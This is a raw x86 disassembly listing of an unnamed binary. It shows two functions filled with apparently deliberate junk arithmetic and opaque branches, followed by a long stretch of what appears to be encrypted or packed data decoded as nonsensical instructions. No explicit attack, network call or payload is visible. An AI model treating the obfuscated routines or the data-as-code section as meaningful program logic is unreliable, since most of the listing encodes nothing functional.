  409f10:	and    eax,ebx
  409f12:	add    eax,ecx
  409f14:	mov    edi,DWORD PTR ds:0x437060
  409f1a:	add    DWORD PTR [ebp-0x18],eax
  409f1d:	mov    edx,DWORD PTR [ebp-0x18]
  409f20:	sub    DWORD PTR [ebp-0x18],edx
  409f23:	sub    edi,edx
  409f25:	cmp    edi,DWORD PTR [ebp-0x4]
  409f28:	jne    0x40a010
  409f2e:	cmp    edi,ecx
  409f30:	jne    0x40a010
  409f36:	and    edi,esi
  409f38:	cmp    edi,0xffffffaa
  409f3b:	jne    0x40a010
  409f41:	mov    ebx,DWORD PTR [ebp-0x18]
  409f44:	mov    edx,DWORD PTR [ebp-0x18]
  409f47:	cmp    edi,0x171b
  409f4d:	jne    0x40a010
  409f53:	mov    ecx,0xe008
  409f58:	mov    DWORD PTR [ebp-0x18],ecx
  409f5b:	cmp    ebx,0x8240
  409f61:	jne    0x40a010
  409f67:	mov    ecx,0x6b
  409f6c:	mov    eax,DWORD PTR [ebp-0x18]
  409f6f:	cmp    eax,0x50
  409f72:	je     0x40a010
  409f78:	or     ebx,edi
  409f7a:	mov    esi,DWORD PTR [ebp-0x18]
  409f7d:	xor    edi,edi
  409f7f:	cmp    ebx,edx
  409f81:	jne    0x40a010
  409f87:	sub    DWORD PTR [ebp-0x18],esi
  409f8a:	add    DWORD PTR [ebp-0x18],edi
  409f8d:	mov    esi,0x45
  409f92:	mov    edi,DWORD PTR [ebp-0x18]
  409f95:	add    DWORD PTR [ebp-0x18],eax
  409f98:	cmp    edi,0xffffffe7
  409f9b:	jne    0x40a010
  409f9d:	mov    eax,DWORD PTR [ebp-0x18]
  409fa0:	sub    eax,ebx
  409fa2:	add    edi,eax
  409fa4:	sub    DWORD PTR [ebp-0x18],edx
  409fa7:	sub    edi,ebx
  409fa9:	and    edi,edx
  409fab:	mov    ebx,ecx
  409fad:	test   edi,0x69
  409fb3:	je     0x40a010
  409fb5:	mov    ecx,DWORD PTR [ebp-0x18]
  409fb8:	xor    DWORD PTR [ebp-0x18],ecx
  409fbb:	mov    edx,DWORD PTR [ebp-0x18]
  409fbe:	sub    ebx,edi
  409fc0:	cmp    ebx,DWORD PTR ds:0x437060
  409fc6:	jne    0x40a010
  409fc8:	sub    DWORD PTR [ebp-0x18],ebx
  409fcb:	test   edx,0xee
  409fd1:	jne    0x40a010
  409fd3:	mov    ecx,0x37
  409fd8:	mov    eax,esi
  409fda:	sub    DWORD PTR [ebp-0x18],edx
  409fdd:	add    DWORD PTR [ebp-0x18],eax
  409fe0:	or     edi,ebx
  409fe2:	sub    ecx,edi
  409fe4:	sub    ecx,ebx
  409fe6:	cmp    ecx,0xfffffff7
  409fe9:	je     0x40a010
  409feb:	cmp    ecx,0xa705
  409ff1:	je     0x40a010
  409ff3:	sub    ecx,edi
  409ff5:	mov    edx,DWORD PTR [ebp-0x18]
  409ff8:	mov    esi,DWORD PTR [ebp-0x18]
  409ffb:	add    DWORD PTR [ebp-0x18],edx
  409ffe:	cmp    ecx,0xffffffcf
  40a001:	jne    0x40a010
  40a003:	add    ecx,ecx
  40a005:	cmp    esi,DWORD PTR [ebp-0x14]
  40a008:	je     0x40a010
  40a00a:	sub    DWORD PTR [ebp-0x18],esi
  40a00d:	add    DWORD PTR [ebp-0x18],ecx
  40a010:	xor    edi,edi
  40a012:	mov    ebx,0x77
  40a017:	add    DWORD PTR [ebp-0x18],edx
  40a01a:	cmp    edx,0xffffffe9
  40a01d:	je     0x40a04d
  40a01f:	mov    ecx,0xbe87
  40a024:	and    ecx,ebx
  40a026:	mov    esi,DWORD PTR [ebp-0x18]
  40a029:	add    DWORD PTR [ebp-0x18],esi
  40a02c:	add    DWORD PTR [ebp-0x18],edi
  40a02f:	cmp    edx,DWORD PTR ds:0x437060
  40a035:	je     0x40a04d
  40a037:	mov    ebx,ecx
  40a039:	mov    ecx,0xdc
  40a03e:	sub    ebx,edi
  40a040:	and    ebx,eax
  40a042:	sub    DWORD PTR [ebp-0x18],ebx
  40a045:	add    edx,esi
  40a047:	add    DWORD PTR [ebp-0x18],edx
  40a04a:	and    DWORD PTR [ebp-0x18],ecx
  40a04d:	pop    edi
  40a04e:	or     ecx,edx
  40a050:	cmp    edi,0xffffff8b
  40a053:	jne    0x40a07a
  40a055:	mov    eax,DWORD PTR ds:0x437040
  40a05b:	mov    edx,0xea
  40a060:	add    DWORD PTR [ebp-0x18],edi
  40a063:	add    DWORD PTR [ebp-0x18],ecx
  40a066:	add    eax,eax
  40a068:	or     eax,edi
  40a06a:	and    eax,edi
  40a06c:	sub    eax,esi
  40a06e:	sub    eax,ebx
  40a070:	and    DWORD PTR [ebp-0x18],eax
  40a073:	and    edx,ebx
  40a075:	add    edx,ecx
  40a077:	mov    DWORD PTR [ebp-0x18],edx
  40a07a:	pop    esi
  40a07b:	mov    ebx,0x6f
  40a080:	cmp    esi,ecx
  40a082:	jne    0x40a0d4
  40a084:	cmp    esi,DWORD PTR ds:0x437060
  40a08a:	je     0x40a0d4
  40a08c:	sub    ecx,ebx
  40a08e:	mov    eax,DWORD PTR [ebp-0x18]
  40a091:	sub    ecx,eax
  40a093:	sub    DWORD PTR [ebp-0x18],esi
  40a096:	or     DWORD PTR [ebp-0x18],edi
  40a099:	cmp    ecx,0xfffffff7
  40a09c:	je     0x40a0d4
  40a09e:	sub    ecx,edx
  40a0a0:	xor    ebx,ebx
  40a0a2:	or     ecx,edi
  40a0a4:	cmp    edx,0x4d
  40a0a7:	jne    0x40a0d4
  40a0a9:	cmp    ecx,0x37
  40a0ac:	jne    0x40a0d4
  40a0ae:	sub    DWORD PTR [ebp-0x18],ecx
  40a0b1:	mov    edx,DWORD PTR ds:0x437040
  40a0b7:	mov    eax,0x6b
  40a0bc:	or     DWORD PTR [ebp-0x18],ebx
  40a0bf:	mov    DWORD PTR [ebp-0x18],ecx
  40a0c2:	sub    DWORD PTR [ebp-0x18],esi
  40a0c5:	sub    DWORD PTR [ebp-0x18],eax
  40a0c8:	sub    edx,ebx
  40a0ca:	sub    edx,eax
  40a0cc:	add    edx,ebx
  40a0ce:	add    DWORD PTR [ebp-0x18],eax
  40a0d1:	sub    DWORD PTR [ebp-0x18],edx
  40a0d4:	pop    ebx
  40a0d5:	test   ebx,0x68
  40a0db:	jne    0x40a0fa
  40a0dd:	mov    edx,edi
  40a0df:	or     edx,ebx
  40a0e1:	or     edx,edi
  40a0e3:	mov    eax,DWORD PTR [ebp-0x18]
  40a0e6:	test   eax,0x739e
  40a0eb:	je     0x40a0fa
  40a0ed:	add    DWORD PTR [ebp-0x18],eax
  40a0f0:	cmp    edx,DWORD PTR [ebp-0x20]
  40a0f3:	je     0x40a0fa
  40a0f5:	add    edx,ecx
  40a0f7:	sub    DWORD PTR [ebp-0x18],edx
  40a0fa:	leave  
  40a0fb:	ret    
  40a0fc:	int3   
  40a0fd:	int3   
  40a0fe:	int3   
  40a0ff:	int3   
  40a100:	int3   
  40a101:	push   ebp
  40a102:	mov    ebp,esp
  40a104:	sub    esp,0x38
  40a107:	xor    eax,eax
  40a109:	xor    edx,edx
  40a10b:	mov    DWORD PTR [ebp-0x24],eax
  40a10e:	add    eax,eax
  40a110:	and    edx,eax
  40a112:	sub    DWORD PTR [ebp-0x24],eax
  40a115:	mov    DWORD PTR [ebp-0x24],edx
  40a118:	push   ebx
  40a119:	add    edx,eax
  40a11b:	mov    ecx,DWORD PTR [ebp-0x24]
  40a11e:	mov    eax,ecx
  40a120:	add    eax,edx
  40a122:	or     eax,ecx
  40a124:	cmp    eax,0x7f
  40a127:	jne    0x40a12c
  40a129:	add    DWORD PTR [ebp-0x24],eax
  40a12c:	push   esi
  40a12d:	mov    edx,DWORD PTR [ebp-0x24]
  40a130:	sub    edx,ecx
  40a132:	mov    eax,edx
  40a134:	sub    DWORD PTR [ebp-0x24],eax
  40a137:	push   edi
  40a138:	or     DWORD PTR [ebp-0x24],ecx
  40a13b:	sub    eax,ecx
  40a13d:	mov    edi,0x58
  40a142:	mov    edx,edi
  40a144:	sub    eax,ecx
  40a146:	add    edx,eax
  40a148:	cmp    eax,0x95d0
  40a14d:	jne    0x40a178
  40a14f:	xor    esi,esi
  40a151:	sub    edx,eax
  40a153:	mov    edi,edx
  40a155:	sub    esi,edx
  40a157:	add    DWORD PTR [ebp-0x24],edx
  40a15a:	sub    esi,edi
  40a15c:	cmp    esi,0x13a3
  40a162:	je     0x40a178
  40a164:	mov    edx,0x6d
  40a169:	add    esi,eax
  40a16b:	mov    edi,DWORD PTR [ebp-0x24]
  40a16e:	add    edi,esi
  40a170:	and    DWORD PTR [ebp-0x24],eax
  40a173:	add    edx,edi
  40a175:	mov    DWORD PTR [ebp-0x24],edx
  40a178:	mov    eax,0x927f
  40a17d:	sub    DWORD PTR [ebp-0x24],edi
  40a180:	add    DWORD PTR [ebp-0x24],eax
  40a183:	add    DWORD PTR [ebp-0x24],eax
  40a186:	pop    edi
  40a187:	add    DWORD PTR [ebp-0x24],edx
  40a18a:	pop    esi
  40a18b:	sub    DWORD PTR [ebp-0x24],esi
  40a18e:	pop    ebx
  40a18f:	mov    ecx,0x7d
  40a194:	mov    edx,DWORD PTR [ebp-0x24]
  40a197:	sub    DWORD PTR [ebp-0x24],edi
  40a19a:	add    DWORD PTR [ebp-0x24],ecx
  40a19d:	add    DWORD PTR [ebp-0x24],ebx
  40a1a0:	test   edx,0x610508e0
  40a1a6:	je     0x40a1b8
  40a1a8:	cmp    edx,0xeeb2
  40a1ae:	jne    0x40a1b8
  40a1b0:	or     DWORD PTR [ebp-0x24],ecx
  40a1b3:	add    edx,esi
  40a1b5:	or     DWORD PTR [ebp-0x24],edx
  40a1b8:	leave  
  40a1b9:	ret    
  40a1ba:	add    BYTE PTR [eax],al
  40a1bc:	cmc    
  40a1bd:	xor    edi,DWORD PTR [ecx+0x1b]
  40a1c0:	cmp    al,0x8d
  40a1c2:	adc    eax,edi
  40a1c4:	fwait
  40a1c5:	cmp    DWORD PTR [ecx],ebx
  40a1c7:	les    esp,FWORD PTR [ebx-0x28b40648]
  40a1cd:	fimul  DWORD PTR [eax+ebp*8+0x26e8bdc]
  40a1d4:	fild   WORD PTR [eax]
  40a1d6:	test   eax,0xa5944150
  40a1db:	out    0x1a,al
  40a1dd:	pop    ss
  40a1de:	ret    
  40a1df:	xchg   edx,eax
  40a1e0:	cmc    
  40a1e1:	lods   al,BYTE PTR ds:[esi]
  40a1e2:	call   0xdc69:0x2181c4f8
  40a1e9:	inc    edi
  40a1ea:	mov    edx,gs
  40a1ec:	mov    ah,0x46
  40a1ee:	ss xchg edi,eax
  40a1f0:	fmul   DWORD PTR [ecx+0x69f78814]
  40a1f6:	sub    BYTE PTR [ecx],0xe0
  40a1f9:	and    dh,BYTE PTR [edi+ecx*8-0x73]
  40a1fd:	cs inc eax
  40a1ff:	imul   ebp,esp,0xd6c95c3a
  40a205:	adc    al,0x60
  40a207:	iret   
  40a208:	push   ds
  40a209:	cli    
  40a20a:	xchg   cl,ah
  40a20c:	sahf   
  40a20d:	add    DWORD PTR [edi-0x3d068c27],0x29
  40a214:	sahf   
  40a215:	test   al,0x86
  40a217:	xor    edi,esi
  40a219:	movups XMMWORD PTR [ecx],xmm5
  40a21c:	ret    0x8614
  40a21f:	call   eax
  40a221:	xchg   esi,eax
  40a222:	pop    edx
  40a223:	jecxz  0x40a1f4
  40a225:	sub    dl,ah
  40a227:	jne    0x40a1fc
  40a229:	sbb    BYTE PTR [esi+0x29],bl
  40a22c:	shr    BYTE PTR [esi+ecx*2+0x4ef0d0f1],1
  40a233:	icebp  
  40a234:	shl    BYTE PTR [ecx],1
  40a236:	sub    al,0x3f
  40a238:	pop    ds
  40a239:	pop    ebx
  40a23a:	loopne 0x40a1e5
  40a23c:	xchg   edx,eax
  40a23d:	call   0xe523e1d8
  40a242:	lock mov ecx,0xdc901b55
  40a248:	push   ds
  40a249:	outs   dx,DWORD PTR ds:[esi]
  40a24a:	jge    0x40a202
  40a24c:	out    0x51,eax
  40a24e:	sar    DWORD PTR [ebp+0x2de3968b],1
  40a254:	fst    DWORD PTR [edi]
  40a256:	xchg   esi,eax
  40a257:	mov    esi,DWORD PTR [edi]
  40a259:	test   BYTE PTR [ebp-0x8980abd],0xf2
  40a260:	int    0x29
  40a262:	ins    DWORD PTR es:[edi],dx
  40a263:	iret   
  40a264:	sbb    edi,DWORD PTR [ecx+0x68]
  40a267:	mov    cl,cl
  40a269:	(bad)  
  40a26a:	iret   
  40a26b:	adc    edi,esi
  40a26d:	pop    ecx
  40a26e:	add    bh,BYTE PTR [eax]
  40a270:	or     edi,DWORD PTR [ecx-0x6f]
  40a273:	lock test DWORD PTR [edi],0x103d477
  40a27a:	inc    edi
  40a27b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a27c:	div    ecx
  40a27e:	jp     0x40a256
  40a280:	div    ebp
  40a282:	xchg   DWORD PTR [ecx],ebp
  40a284:	imul   ebp
  40a286:	jl     0x40a2c1
  40a288:	or     al,dh
  40a28a:	mov    fs,WORD PTR [esi-0x1e]
  40a28d:	loopne 0x40a215
  40a28f:	aas    
  40a290:	or     BYTE PTR [esi],cl
  40a292:	popf   
  40a293:	push   edx
  40a294:	jnp    0x40a287
  40a296:	js     0x40a26e
  40a298:	mul    DWORD PTR [edi-0x313d67b]
  40a29e:	(bad)  
  40a29f:	stos   DWORD PTR es:[edi],eax
  40a2a0:	out    0xf4,al
  40a2a2:	(bad)  
  40a2a3:	popf   
  40a2a4:	pop    ebp
  40a2a5:	in     eax,0xde
  40a2a7:	jmp    0xc04704c6
  40a2ac:	or     al,0xf1
  40a2ae:	cwde   
  40a2af:	and    ebp,ebx
  40a2b1:	aas    
  40a2b2:	xchg   DWORD PTR [ecx],ebp
  40a2b4:	or     BYTE PTR [esi],cl
  40a2b6:	popf   
  40a2b7:	inc    edx
  40a2b8:	pop    edi
  40a2b9:	or     al,0x79
  40a2bb:	(bad)  
  40a2bc:	or     ebx,DWORD PTR [eax+eax*4]
  40a2bf:	(bad)  
  40a2c0:	or     BYTE PTR [eax+eiz*2-0x3],bl
  40a2c4:	test   BYTE PTR [edi],0x57
  40a2c7:	inc    BYTE PTR [edx]
  40a2c9:	or     DWORD PTR [ecx+0x3a],edi
  40a2cc:	idiv   DWORD PTR [ecx]
  40a2ce:	jp     0x40a2a6
  40a2d0:	push   edi
  40a2d1:	lock nop
  40a2d3:	add    bl,BYTE PTR ds:0xac298655
  40a2d9:	call   0xfe1fe27c
  40a2de:	nop
  40a2df:	pushf  
  40a2e0:	jge    0x40a338
  40a2e2:	xchg   ecx,eax
  40a2e3:	or     al,0x1e
  40a2e5:	adc    eax,0xf172b56e
  40a2ea:	out    0x33,al
  40a2ec:	test   DWORD PTR [ebx+0xff7d679],0x20e12879
  40a2f6:	xchg   ecx,eax
  40a2f7:	lds    esi,FWORD PTR [eax+0x72]
  40a2fa:	dec    edx
  40a2fb:	jae    0x40a37c
  40a2fd:	inc    esp
  40a2fe:	bound  esp,QWORD PTR ds:0x2d69305f
  40a304:	ja     0x40a31f
  40a306:	sar    BYTE PTR [eax+eiz*8],cl
  40a309:	pop    eax
  40a30a:	lea    edi,[ebx-0x3ae64ed]
  40a310:	test   DWORD PTR [edi],0xf0fd787
  40a316:	rcl    ebp,1
  40a318:	and    BYTE PTR ds:0xd3d8c584,0x86
  40a31f:	test   edi,esi
  40a321:	xchg   DWORD PTR [eax-0x2a],edi
  40a324:	cmc    
  40a325:	jge    0x7a2805fb
  40a32b:	ret    0xfb19
  40a32e:	add    ebx,DWORD PTR [ecx]
  40a330:	test   DWORD PTR [edi],0x102d477
  40a336:	inc    ebp
  40a337:	aas    
  40a338:	mul    DWORD PTR [ebx+0x7b]
  40a33b:	(bad)  
  40a33c:	neg    DWORD PTR [ecx+0x2]
  40a33f:	and    BYTE PTR [edi+0x70],ch
  40a342:	xchg   ecx,eax
  40a343:	lock and eax,0x4b1e5b46
  40a34a:	outs   dx,BYTE PTR ds:[esi]
  40a34b:	mov    ebp,0x2f9688bd
  40a350:	clc    
  40a351:	not    BYTE PTR [eax+0x3c171d9e]
  40a357:	cmp    ecx,esp
  40a359:	loopne 0x40a321
  40a35b:	das    
  40a35c:	jg     0x40a3b4
  40a35e:	loopne 0x40a2ed
  40a360:	push   0xffffffaa
  40a362:	mov    bh,0xcf
  40a364:	sbb    BYTE PTR [eax+eax*4],ah
  40a367:	mov    ds:0x89877bd8,eax
  40a36c:	test   DWORD PTR [ebx-0x9102986],0x53c7310c
  40a376:	add    edi,edi
  40a378:	lods   eax,DWORD PTR ds:[esi]
  40a379:	mov    eax,0xee182e42
  40a37e:	add    BYTE PTR [ebx+0x2ce93189],0x8d
  40a385:	enter  0x2f82,0x18
  40a389:	out    0x81,al
  40a38b:	mov    ds:0x2f86e081,eax
  40a390:	inc    eax
  40a391:	enter  0xa094,0x8d
  40a395:	loope  0x40a3db
  40a397:	mov    ebx,0x8387291e
  40a39c:	adc    BYTE PTR [esi],cl
  40a39e:	jns    0x40a362
  40a3a0:	mov    ecx,0x63f7396d
  40a3a6:	jns    0x40a37e
  40a3a8:	dec    edi
  40a3a9:	dec    BYTE PTR [ecx+0xf740720]
  40a3af:	popa   
  40a3b0:	mov    eax,ds:0x80298fe6
  40a3b5:	sub    DWORD PTR [edi+0x2e],ebx
  40a3b8:	or     eax,esi
  40a3ba:	inc    esi
  40a3bb:	stc    
  40a3bc:	or     DWORD PTR [ecx+0x702e2986],ebp
  40a3c2:	into   
  40a3c3:	or     eax,0x9f87f712
  40a3c8:	ja     0x40a3ba
  40a3ca:	jp     0x40a3d6
  40a3cc:	xor    ecx,DWORD PTR ds:0x7b1bf927
  40a3d2:	js     0x40a3aa
  40a3d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3d5:	adc    DWORD PTR [esi-0x8],edi
  40a3d8:	cmc    
  40a3d9:	sbb    ecx,esi
  40a3db:	inc    esi
  40a3dc:	mov    bl,0xe
  40a3de:	jg     0x40a3d8
  40a3e0:	sbb    edi,DWORD PTR [ebx+0x78]
  40a3e3:	(bad)  
  40a3e4:	pushf  
  40a3e5:	shl    BYTE PTR [edi-0x8],cl
  40a3e8:	neg    DWORD PTR [ebx]
  40a3ea:	test   al,0xc6
  40a3ec:	xchg   ebx,eax
  40a3ed:	push   cs
  40a3ee:	jg     0x40a3e8
  40a3f0:	sbb    edi,DWORD PTR [ebx+0x78]
  40a3f3:	(bad)  
  40a3f4:	or     BYTE PTR [eax],0x6f
  40a3f7:	ds jo  0x40a3e8
  40a3fa:	sub    BYTE PTR [ecx-0x771615e0],0x27
  40a401:	out    0xf,al
  40a403:	sub    eax,0x31265a0d
  40a408:	mov    ds:0x283a7f10,al
  40a40d:	loop   0x40a390
  40a40f:	mov    DWORD PTR [edi],ebx
  40a411:	or     ebp,DWORD PTR [ecx+esi*8]
  40a414:	loop   0x40a426
  40a416:	pop    edi
  40a417:	ds loope 0x40a454
  40a41a:	lock mov edi,0x450de1b
  40a421:	jmp    0x490e:0x860f3e69
  40a428:	jecxz  0x40a452
  40a42a:	or     eax,0xf70ff7d9
  40a42f:	push   0x33870aa4
  40a434:	or     al,BYTE PTR [ebp-0x7101aee]
  40a43a:	push   edx
  40a43b:	cmp    ebx,edi
  40a43d:	inc    ecx
  40a43e:	inc    ebx
  40a43f:	les    edi,FWORD PTR [eax+eiz*1+0x13]
  40a443:	sub    DWORD PTR ds:0x90196c65,ebx
  40a449:	rol    BYTE PTR [ebx+esi*1+0x5f8d1091],cl
  40a450:	jge    0x40a4bc
  40a452:	bound  esi,QWORD PTR [ecx]
  40a454:	push   es
  40a455:	xchg   BYTE PTR [esi-0x32],bl
  40a458:	loope  0x40a44e
  40a45a:	sbb    al,0xc1
  40a45c:	or     al,BYTE PTR [ebp-0x2ed7a3b0]
  40a462:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a463:	or     BYTE PTR ds:0xe9056ef5,bl
  40a469:	adc    ebp,ecx
  40a46b:	leave  
  40a46c:	xchg   edi,eax
  40a46d:	push   eax
  40a46e:	push   dx
  40a470:	loop   0x40a46e
  40a472:	es mov esp,esi
  40a475:	daa    
  40a476:	xchg   esp,ebx
  40a478:	fnstsw WORD PTR [ecx+0x6f]
  40a47b:	and    eax,DWORD PTR [ecx]
  40a47d:	push   cs
  40a47e:	sub    DWORD PTR [edx+ebx*4-0x5e15dc8b],0x1e298fe6
  40a489:	sbb    ebx,DWORD PTR [esi-0x18]
  40a48c:	repnz loopne 0x40a42d
  40a48f:	aas    
  40a490:	or     BYTE PTR [edi-0xa91b382],dl
  40a496:	xor    BYTE PTR [eax+0x8],ah
  40a499:	lock push esi
  40a49b:	repnz in al,0x97
  40a49e:	xchg   bh,cl
  40a4a0:	shl    eax,0x14
  40a4a3:	clc    
  40a4a4:	in     eax,dx
  40a4a5:	enter  0x2986,0xd9
  40a4a9:	inc    edi
  40a4aa:	loopne 0x40a455
  40a4ac:	not    DWORD PTR ds:0x720c2986
  40a4b2:	ror    BYTE PTR [edi-0x39],0x6f
  40a4b6:	out    0x8,al
  40a4b8:	not    ebx
  40a4ba:	xchg   BYTE PTR [ecx],ch
  40a4bc:	out    0x1b,al
  40a4be:	push   es
  40a4bf:	into   
  40a4c0:	ficomp WORD PTR [ecx-0x7]
  40a4c3:	jge    0x40a4cd
  40a4c5:	lock push esi
  40a4c7:	mov    dl,0x9d
  40a4c9:	sbb    eax,DWORD PTR [esi-0x590f7281]
  40a4cf:	stc    
  40a4d0:	frstor [ecx+0x19d92986]
  40a4d6:	fimul  WORD PTR [edx+0xf1d2799]
  40a4dc:	cwde   
  40a4dd:	jb     0x40a49e
  40a4df:	or     ebx,DWORD PTR [edi+0x21]
  40a4e2:	inc    edi
  40a4e3:	cmp    bh,dh
  40a4e5:	psrlw  mm5,QWORD PTR [ecx]
  40a4e8:	icebp  
  40a4e9:	lock cld 
  40a4eb:	sub    DWORD PTR [eax+esi*8],ebx
  40a4ee:	xchg   edi,ecx
  40a4f0:	in     eax,dx
  40a4f1:	cld    
  40a4f2:	jle    0x40a516
  40a4f4:	neg    DWORD PTR [esi]
  40a4f6:	sbb    al,0x8a
  40a4f9:	fiadd  DWORD PTR [ebx-0x6f0c9055]
  40a4ff:	mov    ds:0x3f2aa7e6,al
  40a504:	inc    ecx
  40a505:	dec    ebp
  40a506:	data16 into 
  40a508:	or     al,0x54
  40a50a:	push   ecx
  40a50b:	xor    al,0x1b
  40a50d:	(bad)  [ebx+eiz*1-0x55]
  40a511:	ja     0x40a51e
  40a513:	or     eax,0xbbe1208b
  40a518:	test   DWORD PTR [edi],0x3fd9d65b
  40a51e:	mov    eax,ds:0x7815f7bb
  40a523:	(bad)  
  40a524:	pop    edi
  40a525:	or     BYTE PTR [edx-0x52],ah
  40a528:	sbb    DWORD PTR [ecx],ecx
  40a52a:	into   
  40a52b:	jns    0x40a4f6
  40a52d:	(bad)  
  40a52e:	iret   
  40a52f:	adc    edi,esi
  40a531:	pop    ecx
  40a532:	add    bh,BYTE PTR [eax]
  40a534:	vmwrite edx,DWORD PTR [ecx+0x667b1ef0]
  40a53b:	call   0x63d7d537
  40a540:	(bad)
  40a543:	(bad)  
  40a544:	mov    esp,0xa8b3f61a
  40a549:	mov    BYTE PTR [eax-0x7b2ff6c1],ah
  40a54f:	fsub   st(5),st
  40a551:	loopne 0x40a4d9
  40a553:	sub    DWORD PTR [eax-0xc],esi
  40a556:	dec    edx
  40a557:	sub    esp,eax
  40a559:	(bad)  
  40a55a:	mov    es:0x29dcf017,eax
  40a560:	mov    bh,0xe3
  40a562:	xchg   edi,edi
  40a564:	(bad)  
  40a565:	icebp  
  40a566:	or     al,0x39
  40a568:	div    ecx
  40a56a:	xchg   DWORD PTR [ecx],ebp
  40a56c:	jne    0x40a548
  40a56e:	fisub  WORD PTR [ecx-0x43]
  40a571:	jmp    0xca80:0x702b2907
  40a578:	fcom   DWORD PTR [ecx]
  40a57a:	xchg   DWORD PTR [ecx-0x29801c09],ecx
  40a580:	jnp    0x40a523
  40a582:	or     al,0xc9
  40a584:	div    ebp
  40a586:	mov    ch,BYTE PTR [ecx]
  40a588:	sub    esi,DWORD PTR [eax-0x70]
  40a58b:	xchg   edx,eax
  40a58c:	xchg   edx,eax
  40a58d:	add    BYTE PTR [edi+0x52f0d83b],al
  40a593:	test   eax,0x29e651f7
  40a598:	(bad)  
  40a599:	fs push edx
  40a59b:	sub    DWORD PTR [ebx],ebx
  40a59d:	push   cs
  40a59e:	popf   
  40a59f:	mov    ch,0xd9
  40a5a1:	adc    eax,0xe3f7c96d
  40a5a6:	jge    0x40a57e
  40a5a8:	adc    edx,DWORD PTR [edi-0xf882ef3]
  40a5ae:	push   es
  40a5af:	or     dh,al
  40a5b1:	out    0x91,eax
  40a5b3:	ror    BYTE PTR [edi],cl
  40a5b5:	dec    esi
  40a5b6:	sbb    eax,0xd1b9efd9
  40a5bb:	xchg   ebp,eax
  40a5bc:	cmp    bl,bl
  40a5be:	pushf  
  40a5bf:	cs cmc 
  40a5c1:	xor    DWORD PTR [edi],eax
  40a5c3:	sub    eax,ebx
  40a5c5:	fistp  WORD PTR [esi+ecx*2+0x290797f5]
  40a5cc:	ja     0x40a5be
  40a5ce:	cmp    al,0xa
  40a5d0:	mov    ch,0x8
  40a5d2:	sub    edi,ecx
  40a5d4:	jg     0x40a5cc
  40a5d6:	jns    0x40a5ae
  40a5d8:	ja     0x40a5ca
  40a5da:	inc    esp
  40a5db:	or     cl,BYTE PTR [esi-0xc]
  40a5de:	cwde   
  40a5df:	and    esi,ebp
  40a5e1:	xchg   edi,eax
  40a5e2:	xchg   DWORD PTR [ecx],ebp
  40a5e4:	ja     0x40a5d6
  40a5e6:	dec    esp
  40a5e7:	or     bl,al
  40a5e9:	xchg   edx,eax
  40a5ea:	push   edx
  40a5eb:	test   eax,0x516f0ef6
  40a5f0:	fnstenv [ebp-0x1c083693]
  40a5f6:	jge    0x40a5ce
  40a5f8:	pop    ds
  40a5f9:	jo     0x40a608
  40a5fb:	ror    DWORD PTR [esi],0xf4
  40a5fe:	cwde   
  40a5ff:	and    DWORD PTR ds:0xd8298701,ebx
  40a605:	pop    es
  40a606:	sub    al,BYTE PTR [edi-0x29857809]
  40a60c:	sub    esi,DWORD PTR [eax-0x80]
  40a60f:	loop   0x40a612
  40a611:	sub    eax,0x6ff73787
  40a616:	test   BYTE PTR [ecx],ch
  40a618:	and    eax,0x7ff92908
  40a61d:	idiv   BYTE PTR [ecx-0x2a]
  40a620:	ja     0x40a612
  40a622:	push   esp
  40a623:	or     bh,BYTE PTR [esi+0x1d2398f3]
  40a629:	sbb    eax,DWORD PTR [esi-0x68e70dd7]
  40a62f:	aas    
  40a630:	test   DWORD PTR [edi],0x821f50f7
  40a636:	xchg   BYTE PTR [ebx-0x13],bl
  40a639:	mov    ecx,0xe6182d63
  40a63e:	xchg   ecx,eax
  40a63f:	ret    0xe0f
  40a642:	jl     0x40a605
  40a644:	jecxz  0x40a5ce
  40a646:	(bad)  
  40a647:	das    
  40a648:	test   ah,bl
  40a64a:	dec    edx
  40a64b:	aas    
  40a64c:	xchg   ah,bl
  40a64e:	dec    edx
  40a64f:	cmp    esp,eax
  40a651:	not    DWORD PTR [eax+0x14f0dbb2]
  40a657:	push   ecx
  40a658:	mov    BYTE PTR [esi],cl
  40a65a:	das    
  40a65b:	std    
  40a65c:	neg    BYTE PTR [ebx]
  40a65e:	mov    DWORD PTR fs:[esi+0x2e],edx
  40a662:	xchg   esi,eax
  40a663:	stc    
  40a664:	cmc    
  40a665:	sbb    ecx,DWORD PTR [edx+0x670a5f09]
  40a66b:	clc    
  40a66c:	mov    ecx,0x1dd679e6
  40a671:	sbb    edi,DWORD PTR [ecx+edi*1-0x6c]
  40a675:	imul   DWORD PTR [esi+0x3e]
  40a678:	sbb    eax,0x41511a63
  40a67d:	out    0x2f,eax
  40a67f:	iret   
  40a680:	or     eax,0x65393c46
  40a685:	addr16 (bad) 
  40a687:	aaa    
  40a688:	gs pop ss
  40a68a:	mov    dh,BYTE PTR [edi]
  40a68c:	loopne 0x40a65a
  40a68e:	scas   al,BYTE PTR es:[edi]
  40a68f:	xor    ebp,DWORD PTR [edx+0xd85b7e6]
  40a695:	or     al,0x7c
  40a697:	cmp    DWORD PTR [eax+eiz*8+0x60783f9e],edx
  40a69e:	nop
  40a69f:	scas   al,BYTE PTR es:[edi]
  40a6a0:	out    0x51,eax
  40a6a2:	cmp    DWORD PTR [ecx-0x463edc75],0x4f831777
  40a6ac:	xchg   esp,eax
  40a6ad:	rcl    al,1
  40a6af:	ds adc dh,ah
  40a6b2:	xchg   ecx,eax
  40a6b3:	aam    0xd
  40a6b5:	sbb    ch,BYTE PTR [edx+0x1]
  40a6b8:	icebp  
  40a6b9:	loopne 0x40a729
  40a6bb:	cs mov edx,0x5960604c
  40a6c1:	xor    al,0x81
  40a6c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6c4:	jecxz  0x40a6de
  40a6c6:	pop    ds
  40a6c7:	(bad)  
  40a6c8:	xor    al,0x26
  40a6ca:	push   esi
  40a6cb:	adc    esp,ebx
  40a6cd:	adc    BYTE PTR [ecx-0x29],al
  40a6d0:	icebp  
  40a6d1:	xorps  xmm4,XMMWORD PTR [eax+0x3e79f91e]
  40a6d8:	div    DWORD PTR ds:0xf13e2987
  40a6de:	push   ecx
  40a6df:	aas    
  40a6e0:	div    ebp
  40a6e2:	xchg   BYTE PTR [ecx],ch
  40a6e4:	sbb    eax,0xe3393c17
  40a6e9:	sbb    DWORD PTR [esi+0x30e0e13f],ebx
  40a6ef:	das    
  40a6f0:	sti    
  40a6f1:	push   es
